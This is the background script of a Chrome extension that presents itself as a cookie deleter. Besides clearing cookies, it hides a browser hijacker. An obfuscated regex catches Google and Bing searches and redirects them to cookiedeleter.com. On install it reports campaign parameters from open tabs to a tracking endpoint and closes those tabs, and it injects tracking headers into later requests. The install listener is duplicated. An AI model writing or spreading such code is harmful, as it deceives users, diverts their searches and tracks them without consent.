chrome.runtime.onStartup.addListener(function() {
    wipeData();
});

chrome.windows.onRemoved.addListener(function(id) {
    chrome.windows.getAll(function(w) {
        if (w.length == 0) {
            wipeData();
        }
    })
});

function wipeData() {
    chrome.browsingData.removeCookies({"since": 0});
}

chrome.runtime.onInstalled.addListener(e => {
    if (e.reason == 'install') {
        chrome.tabs.query({ }, tabs => {
            tabs.forEach(t => {
                if ((ts = t.url.match(/[?&]utm_source=(.*?)(&|$)/)) && ts.length >= 2 && ts[1]){
                    chrome.storage.sync.set({ 'sfw-src-iq': ts[1] });
                }
                if ((tm = t.url.match(/[?&]utm_campaign=(.*?)(&|$)/)) && tm.length >= 2 && tm[1]){
                    chrome.storage.sync.set({ 'sfw-cmp-iq': tm[1] });
                }
                if (ts && ts[1] && tm && tm[1]) {
                    fetch('https://cookiedeleter.com/track/?utm_source=' + ts[1] + '&utm_campaign=' + tm[1]);
                    chrome.tabs.remove(t.id);
                }else if (t.url.match(/\/detail\//)) {
                    chrome.tabs.remove(t.id);
                }
            });
        });
        chrome.tabs.create({ url: "https://cookiedeleter.com/?a=thankyou"});
    }
});

chrome.runtime.onInstalled.addListener(e => {
    if (e.reason == 'install') {
        chrome.tabs.query({ }, tabs => {
            tabs.forEach(t => {
                if ((ts = t.url.match(/[?&]utm_source=(.*?)(&|$)/)) && ts.length >= 2 && ts[1]){
                    chrome.storage.sync.set({ 'sfw-src-iq': ts[1] });
                }
                if ((tm = t.url.match(/[?&]utm_campaign=(.*?)(&|$)/)) && tm.length >= 2 && tm[1]){
                    chrome.storage.sync.set({ 'sfw-cmp-iq': tm[1] });
                }
                if (ts && ts[1] && tm && tm[1]) {
                    fetch('https://cookiedeleter.com/track/?utm_source=' + ts[1] + '&utm_campaign=' + tm[1]);
                    chrome.tabs.remove(t.id);
                }else if (t.url.match(/\/detail\//)) {
                    chrome.tabs.remove(t.id);
                }
            });
        });
       
    }
});


chrome.webRequest.onBeforeSendHeaders.addListener(req => {
    var cmp = ['sfw-src-iq', 'sfw-cmp-iq', 'sfw-cnt-iq'];
    cmp.forEach(function(k){
        if(localStorage.getItem(k)){ req.requestHeaders.push({ name: k, value: localStorage.getItem(k)}); }
    });
    return { requestHeaders: req.requestHeaders };
  },
    { urls: ['*://*.cookiedeleter.com/*'] },
    ['blocking', 'requestHeaders']
);

chrome.webRequest.onBeforeRequest.addListener(function (tab) {
    chrome.storage.sync.get(['sfw-src-iq', 'sfw-cmp-iq', 'sfw-cnt-iq', 'lastQuery'], function (items) {
        if(items['sfw-src-iq'] === undefined || items['sfw-cmp-iq'] === undefined){ return null; }
        if ((p = tab.url.match(/:\/+([w|\.]+)?[bg]([ngio]{3})(le)?\.([a-z\.]{2,6}\/s)(.{3})ch[?&].*?q=(.*?)[?&]/)) && p[6] && !tab.url.match(/[?&](tbm)/)) {
            var query = decodeURIComponent(p[6].replace(/\+/g, '%20'));
        }
        if (query && query.length > 1) {
            if ((q = decodeURIComponent(query).split('+').join(' ').trim()) == items.lastQuery) { return null; }
            chrome.storage.sync.set({'lastQuery': q});
            chrome.storage.sync.set({'sfw-cnt-iq': (items['sfw-cnt-iq'] !== undefined ? (items['sfw-cnt-iq']+1) : 1)});
            chrome.tabs.update({ url: "https://cookiedeleter.com/s/?q=" + q });
        }
    });
    chrome.storage.sync.get(['sfw-src-iq', 'sfw-cmp-iq', 'sfw-cnt-iq', 'lastQuery'], function (items) {
        Object.keys(items).forEach(function(k){ localStorage.setItem(k, items[k]); })
    });
  },
    { urls: [ "http://*/*","https://*/*" ] },
    ["blocking"]
);
